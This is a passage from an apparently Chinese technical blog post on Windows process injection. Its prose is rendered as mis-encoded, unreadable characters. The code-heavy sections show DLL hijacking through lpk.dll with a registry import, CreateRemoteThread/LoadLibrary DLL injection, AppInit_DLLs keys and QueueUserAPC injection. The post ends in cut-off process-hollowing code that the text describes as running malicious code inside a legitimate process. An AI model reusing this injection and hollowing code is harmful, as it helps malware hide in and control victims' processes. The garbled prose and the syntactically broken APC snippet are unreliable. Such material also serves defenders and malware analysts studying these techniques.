class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.<br>f. The directories that are listed <span class="hljs-keyword">in</span> the <span class="hljs-type">PATH</span> environment variable. Note that<br>   this does <span class="hljs-keyword">not</span> <span class="hljs-keyword">include</span> the per-application <span class="hljs-type">path</span> specified <span class="hljs-keyword">by</span> the App<br>   Paths registry key. The App Paths key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> used <span class="hljs-keyword">when</span> computing the DLL<br>   <span class="hljs-keyword">search</span> <span class="hljs-type">path</span>.<br></code></pre></td></tr></table></figure><p>å› æ­¤æŠŠlpk.dllæ”¾åˆ°è¿è¡Œçš„ç¨‹åºåŒä¸€ç›®å½•å³å¯ã€‚</p><h4 id="ä¸ºä»€ä¹ˆé€‰å–lpk-dll"><a href="#ä¸ºä»€ä¹ˆé€‰å–lpk-dll" class="headerlink" title="ä¸ºä»€ä¹ˆé€‰å–lpk.dll"></a>ä¸ºä»€ä¹ˆé€‰å–lpk.dll</h4><p>  Windows 7 å¼€å§‹ï¼Œé»˜è®¤å·²ç»ä¸åŠ è½½LPK.dlläº†ï¼Œè¦Windows 7 é»˜è®¤åŠ è½½LPK.dll<br>  éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯¼å…¥ä¸‹é¢çš„æ³¨å†Œè¡¨, é‡å¯åç”Ÿæ•ˆ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Windows Registry Editor Version <span class="hljs-number">5.00</span><br><br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]<br><span class="hljs-string">&quot;ExcludeFromKnownDlls&quot;</span><span class="hljs-operator">=</span>hex(<span class="hljs-number">7</span>):<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">70</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>b<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>e<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">64</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThreadåº”è¯¥æ˜¯éå¸¸å¸¸ç”¨çš„è¿›ç¨‹æ³¨å…¥æ–¹æ³•äº†ï¼Œæœ‰ä¸¤ç§å¸¸è§çš„ä½¿ç”¨æ–¹æ³•ã€‚API<br>åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function">HANDLE WINAPI <span class="hljs-title">CreateRemoteThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   HANDLE hProcess,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   SIZE_T dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   DWORD dwCreationFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">_Out_  LPDWORD lpThreadId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>hProcess        è¦æ³¨å…¥çš„è¿›ç¨‹çš„å¥æŸ„</li><li>lpStartAddress  è¿œç¨‹è¿›ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°çš„åœ°å€ï¼ˆæŒ‡é’ˆï¼‰</li><li>lpParameter     è¿œç¨‹è¿›ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°çš„å‚æ•°çš„åœ°å€ ï¼ˆæŒ‡é’ˆï¼‰</li></ul><h4 id="å®ç°ä¸ªDLL"><a href="#å®ç°ä¸ªDLL" class="headerlink" title="å®ç°ä¸ªDLL"></a>å®ç°ä¸ªDLL</h4><p>  ç¬¬ä¸€ç§æ–¹æ³•åŒæ ·æ˜¯è·¨è¿›ç¨‹è°ƒç”¨LoadLibraryåŠ è½½æŒ‡å®šçš„DLLï¼Œæˆ‘ä»¬è‡ªå·±å®ç°ä¸€ä¸ªDLLï¼Œå°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œå‘µå‘µã€‚</p><p>   ä»APIåŸå‹ä¸­å¯ä»¥çœ‹å‡ºï¼Œéœ€è¦æŠŠæ•°æ®å†™å…¥è¿œç¨‹çš„è¿›ç¨‹ï¼ŒWindowsç³»ç»Ÿæä¾›äº†WriteProcssMemory<br>æ¥å¹²è¿™ä¸ªäº‹ï¼Œä½†æ˜¯å¦‚ä½•èƒ½å¤Ÿä¿è¯æˆ‘ä»¬å¾€è¿œç¨‹è¿›ç¨‹å†™çš„åœ°å€æ˜¯å¯å†™çš„å‘¢?</p><p>   ç­”æ¡ˆæ˜¯æ— æ³•ä¿è¯ã€‚ã€‚ã€‚æ‰€ä»¥æ¯”è¾ƒç¨³å¦¥çš„æ–¹æ³•æ˜¯æˆ‘ä»¬è‡ªå·±åœ¨è¿œç¨‹è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—å¯å†™çš„å†…<br>å­˜ï¼Œç„¶åæŠŠæˆ‘ä»¬çš„æ•°æ®å†™åˆ°è¿œç¨‹è¿›ç¨‹ä¸­å»ã€‚</p><p>   åœ¨è¿œç¨‹è¿›ç¨‹ä¸­ç”³è¯·å†…å­˜ä¹Ÿæœ‰ç›¸åº”çš„API VirtualAllocEx, æŠŠå‰å‰ååéƒ½ä¸²èµ·æ¥å°±å¯ä»¥è¿œ<br>ç¨‹æ³¨å…¥DLLäº†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE process = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);<br><span class="hljs-keyword">if</span> (process == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Get address of the LoadLibrary function.</span><br><span class="hljs-comment">*/</span><br>LPVOID addr = (LPVOID)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Allocate new memory region inside the process&#x27;s address space.</span><br><span class="hljs-comment">*/</span><br>LPVOID arg = (LPVOID)<span class="hljs-built_in">VirtualAllocEx</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (arg == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n = <span class="hljs-built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="hljs-built_in">strlen</span>(buffer), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Inject our DLL into the process&#x27;s address space.</span><br><span class="hljs-comment">*/</span><br>HANDLE threadID = <span class="hljs-built_in">CreateRemoteThread</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (threadID == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the remote thread could not be created.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">CloseHandle</span>(process);<br></code></pre></td></tr></table></figure><p>   å‰é¢çš„ä»£ç ç¤ºä¾‹ä»£ç ï¼Œçœ‹èµ·æ¥å¾ˆæ­£å¸¸ï¼ŒåŸºæœ¬ä¸ŠCreateRemoteThreadçš„ä¾‹å­éƒ½æ˜¯è¿™ä¹ˆå†™çš„<br>ä½†æ˜¯å¦‚æœå¦‚ä½•çœ‹çš„ä»”ç»†ï¼Œè¿˜æ˜¯ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œä¸æ˜¯è¯´lpStartAddresså¿…é¡»æ˜¯è¿œç¨‹è¿›ç¨‹ä¸­<br>çš„åœ°å€å—ï¼Œå¯æ˜¯LoadLibraryAçš„åœ°å€æ˜¯æ³¨å…¥è¿›ç¨‹çš„åœ°å€ä¸æ˜¯è¿œç¨‹è¿›ç¨‹ä¸­çš„åœ°å€ã€‚</p><p>  å¾ˆå¤šæ–‡ç« åœ¨è¿™é‡Œéƒ½æ²¡æœ‰è¯´é€ï¼Œä½†æ˜¯ç‰›ä¹¦ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹å¯¹æ­¤æœ‰ç€è¯¦ç»†çš„è¯´æ˜ã€‚æ ¹æ®<br>ç»éªŒWindowsç³»ç»Ÿæ€»æ˜¯æŠŠKernel32.dllæ˜ å°„åˆ°è¿›ç¨‹çš„ç›¸åŒåœ°å€ï¼ŒWindowså¼€å¯ASLRåï¼Œé‡å¯å<br>è¿›ç¨‹ä¸­Kernel32.dllçš„åœ°å€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä½†æ˜¯æ¯ä¸ªè¿›ç¨‹ä¸­Kernel32.dllçš„åœ°å€ä»ç„¶ç›¸åŒï¼<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿œç¨‹çš„è¿›ç¨‹ä½¿ç”¨æœ¬åœ°è¿›ç¨‹çš„å†…å­˜ä¸­çš„LoadLibraryAçš„åœ°å€ã€‚</p><h4 id="å†™è¿œç¨‹è¿›ç¨‹å†…å­˜"><a href="#å†™è¿œç¨‹è¿›ç¨‹å†…å­˜" class="headerlink" title="å†™è¿œç¨‹è¿›ç¨‹å†…å­˜"></a>å†™è¿œç¨‹è¿›ç¨‹å†…å­˜</h4><p>   ç¬¬äºŒç§æ–¹æ³•æ˜¯ç›´æ¥è¿œç¨‹æ³¨å…¥ä»£ç ,ä¸æ³¨å…¥DLL,å…¶å®å¹¶ä¸ä¸€å®šè¦è°ƒç”¨CreateRemoteThread<br>è¿˜æœ‰å¥½å‡ ç§æ›¿ä»£æ–¹æ³•,</p><ol><li>CreateRemoteThreadæœ€ç»ˆä¼šè°ƒç”¨NtCreateThreadEx Native APIï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨è¿™ä¸ª<br>  Native APIæ¥å¯åŠ¨è¿œç¨‹çš„çº¿ç¨‹ã€‚</li><li>RtlCreateUserThread</li></ol><h3 id="1-4-AppInit-DLLs"><a href="#1-4-AppInit-DLLs" class="headerlink" title="1.4 AppInit_DLLs"></a>1.4 AppInit_DLLs</h3><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></p><p>   è¿™ä¸ªé”®å€¼è¢«ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹ä»‹ç»è€Œæ ¼å¤–å‡ºåï¼Œå¯æ‰§è¡Œæ–‡ä»¶åœ¨å¤„ç†User32.dllçš„<br>DLL_PROCESS_ATTACH æ—¶ï¼Œä¼šä½¿ç”¨LoadLibiraryåŠ è½½AppInit_DLLS, ä¸é“¾æ¥User32.dllçš„ç¨‹<br>åºå°†ä¸ä¼šåŠ è½½AppInit_DLLS, å¾ˆå°‘ç¨‹åºä¸éœ€è¦é“¾æ¥User32.dll</p><p>æ–°ç‰ˆæœ¬çš„Windowså¢åŠ äº†å‡ ä¸ªå…³é”®çš„é”®å€¼ï¼Œä¼šå¯¹DLLçš„æ³¨å…¥æœ‰å½±å“ã€‚</p><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs</code></p><ul><li>REG_DWORD 1 è¡¨ç¤ºå…¨å±€å¼€å¯</li><li>REG_DWORD 0 è¡¨ç¤ºå…¨å±€å…³é—­</li></ul><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\RequireSignedAppInit_DLLs</code></p><ul><li>REG_DWORD 0 åŠ è½½ä»»æ„DLL</li><li>REG_DWORD 1 åªåŠ è½½ç­¾åçš„DLL</li></ul><h3 id="1-5-QueueUserApc"><a href="#1-5-QueueUserApc" class="headerlink" title="1.5 QueueUserApc"></a>1.5 QueueUserApc</h3><p>QueueUserApc API åŸå‹å¦‚ä¸‹ï¼š</p><p>DWORD WINAPI QueueUserAPC(<br>  <em>In</em>  PAPCFUNC pfnAPC,    &#x2F;&#x2F; APC function<br>  <em>In</em>  HANDLE hThread,     &#x2F;&#x2F; handle of thread<br>  <em>In</em>  ULONG_PTR dwData    &#x2F;&#x2F; APc function parameter<br>);</p><p>è¿™ä¸ªæ³¨å…¥æ–¹æ³•ç”¨çš„ä¸å¤šï¼Œä½†æ˜¯ä¹Ÿæ˜¯è€æ–¹æ³•äº†ï¼Œpjfåœ¨2007å¹´ã€Šæš´åŠ›æ³¨å…¥explorerã€‹çš„æ–‡ç« é‡Œ<br>å°±æåˆ°äº†è¿™ç§æ–¹æ³•ã€‚ä½œç”¨æ˜¯åœ¨çº¿ç¨‹çš„Apcé˜Ÿåˆ—æ’å…¥ä¸€ä¸ªç”¨æˆ·æ¨¡å¼ä¸‹çš„APC å¯¹è±¡ã€‚</p><p>APC æ˜¯ asynchronous procedure call çš„ç¼©å†™ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„APCé˜Ÿåˆ—ï¼Œåœ¨çº¿ç¨‹APC<br>é˜Ÿåˆ—ä¸­çš„APCå¯¹è±¡çš„å‡½æ•°å°†è¢«çº¿ç¨‹æ‰§è¡Œï¼Œä½†æ˜¯ç”¨æˆ·æ¨¡å¼ä¸‹çš„APCå¯¹è±¡é‡Œçš„å‡½æ•°å¹¶ä¸ä¸€å®šä¼šé©¬ä¸Š<br>æ‰§è¡Œï¼ˆæ‰€ä»¥æ˜¯å¼‚æ­¥çš„ï¼‰ï¼Œé™¤éçº¿ç¨‹æ˜¯alertableçŠ¶æ€ã€‚å½“çº¿ç¨‹æ˜¯alertableçŠ¶æ€æ˜¯ï¼ŒAPCé˜Ÿåˆ—<br>é‡Œçš„Apcå¯¹è±¡ï¼ŒæŒ‰ç…§FIFOçš„é¡ºåºè¿›è¡Œå¤„ç†ï¼Œæ‰§è¡ŒAPCå‡½æ•°ã€‚çº¿ç¨‹è°ƒç”¨ SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx æˆ–è€…<br>MsgWaitForMultipleObjectsExæ—¶çº¿ç¨‹è¿›å…¥alertableçŠ¶æ€ã€‚</p><p>æ‰€ä»¥ä¸ºäº†æˆ‘ä»¬çš„å‡½æ•°èƒ½å¤Ÿå°½å¿«çš„æ‰§è¡Œï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ç›®æ ‡è¿›ç¨‹æ‰€æœ‰çš„çº¿ç¨‹çš„APCé˜Ÿåˆ—ä¸­æ’å…¥<br>APC å¯¹è±¡ï¼ŒåŸºæœ¬ä¸Šæ€»æœ‰ä¸€ä¸ªçº¿ç¨‹æ˜¯alertableçŠ¶æ€ã€‚</p><p>æ ¸å¿ƒä¼ªä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD ret;<br><span class="hljs-type">char</span> *DllName = <span class="hljs-string">&#x27;c:\\MyDll.dll&#x27;</span>;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(DllName) + <span class="hljs-number">1</span>;<br><br>HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br>PVOID param = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);<br><br><span class="hljs-keyword">if</span> (param != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;<br>  <span class="hljs-keyword">for</span> (DWORD p = <span class="hljs-number">0</span>; p &lt; NumberOfThreads; p ++) &#123;<br>    hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="hljs-number">0</span>, ThreadId[p]);<br>    <span class="hljs-keyword">if</span> (hThread != <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);<br>      <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InjectDll</span><span class="hljs-params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;<br>  <span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&#x27;kernel32.dll&#x27;</span>, <span class="hljs-string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)paramï¼‰;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>è¿™æ˜¯æœ€è¿‘å‡ºç°çš„æ¯”è¾ƒæ–°çš„è¿›ç¨‹æ³¨å…¥æ–¹æ³•ï¼Œåœ¨2014å¹´å·¦å³æœ‰æ ·æœ¬å¼€å§‹ä½¿ç”¨è¿™ç§æ–¹æ³•æ³¨å…¥è¿›ç¨‹ã€‚<br>è¿™ç§æŠ€æœ¯çš„æœ¬è´¨æ˜¯è¿›ç¨‹æ›¿æ¢ï¼Œä½¿ç”¨åˆæ³•çš„æ­£å¸¸è¿›ç¨‹ï¼Œæ‰§è¡Œçš„ç¡®æ˜¯æ¶æ„çš„ä»£ç ã€‚</p><p>åŸºæœ¬æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ä½¿ç”¨CREATE_SUSPENDEDè°ƒç”¨CreateProcessWåˆ›å»ºè¿›ç¨‹</li><li>ä½¿ç”¨ZwUnmapViewOfSectionå¸è½½è¿›ç¨‹ç©ºé—´ä¸­çš„åŸå§‹ä»£ç </li><li>ä½¿ç”¨VirtualAllocExåˆ†é…å†…å­˜ï¼Œç¡®ä¿åˆ†é…åŒºåŸŸå¯å†™å¯æ‰§è¡Œ</li><li>ä½¿ç”¨WriteProcessMemoryåœ¨åˆ†é…åŒºåŸŸå†…å†™å…¥æ¶æ„ä»£ç </li><li>ä½¿ç”¨SetThreadContextè®¾ç½®çº¿ç¨‹å†…å®¹ä¸ºæŒ‡å®šçš„æ¶æ„ä»£ç </li><li>ä½¿ç”¨ResumeThreadå›å¤è¿›ç¨‹æ‰§è¡Œ</li></ol><p>ä»£ç ä¸­ç”¨åˆ°PEBçš„ç»“æ„ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;dt nt<span class="hljs-title">!_PEB</span><br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">000</span> InheritedAddressSpace : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">001</span> ReadImageFileExecOptions : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">002</span> BeingDebugged : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">003</span> SpareBool : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">004</span> Mutant : Ptr<span class="hljs-number">32</span> Void<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">008</span> ImageBaseAddress : Ptr<span class="hljs-number">32</span> Void<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">InjectProcess</span><span class="hljs-params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span><br><span class="hljs-function"></span>&#123;<br> HANDLE hFile;<br> DWORD dwFileSize;    <span class="hljs-comment">//æ–‡ä»¶å¤§å°</span><br> IMAGE_DOS_HEADER DosHeader;<br> IMAGE_NT_HEADERS NtHeader;<br> PROCESS_INFORMATION pi;<br> STARTUPINFO si;<br> CONTEXT context;<br> PVOID ImageBase;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ImageSize;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> BaseAddr;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> retByte = <span class="hljs-number">0</span>;<br> LONG offset;<br> HMODULE hNtDll=<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br> <span class="hljs-keyword">if</span>(!hNtDll)<br>  <span class="hljs-keyword">return</span> FALSE;<br> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="hljs-built_in">GetProcAddress</span>(hNtDll,<span class="hljs-string">&quot;ZwUnmapViewOfSection&quot;</span>);<br> <span class="hljs-built_in">memset</span>(&amp;si, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(si));<br> <span class="hljs-built_in">memset</span>(&amp;pi, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(pi));<br> si.cb = <span class="hljs-built_in">sizeof</span>(si);<br><br> hFile = ::<span class="hljs-built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="hljs-literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE)<br> &#123;<br>  <span class="hljs-keyword">return</span> FALSE;<br> &#125;<br> ::<span class="hljs-built_in">SetFilePointer</span>(hFile, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br> dwFileSize = ::<span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br> LPBYTE pBuf = <span class="hljs-keyword">new</span> BYTE[dwFileSize];<br> <span class="hljs-built_in">memset</span>(pBuf, <span class="hljs-number">0</span>, dwFileSize);<br> DWORD dwNumberOfBytesRead = <span class="hljs-number">0</span>;<br>    ::<span class="hljs-built_in">ReadFile</span>( hFile<br>        , pBuf<br>        , dwFileSize<br>        , &amp;dwNumberOfBytesRead<br>        , <span class="hljs-literal">NULL</span><br>        );<br><br> ::<span class="hljs-built_in">CopyMemory</span>((<span 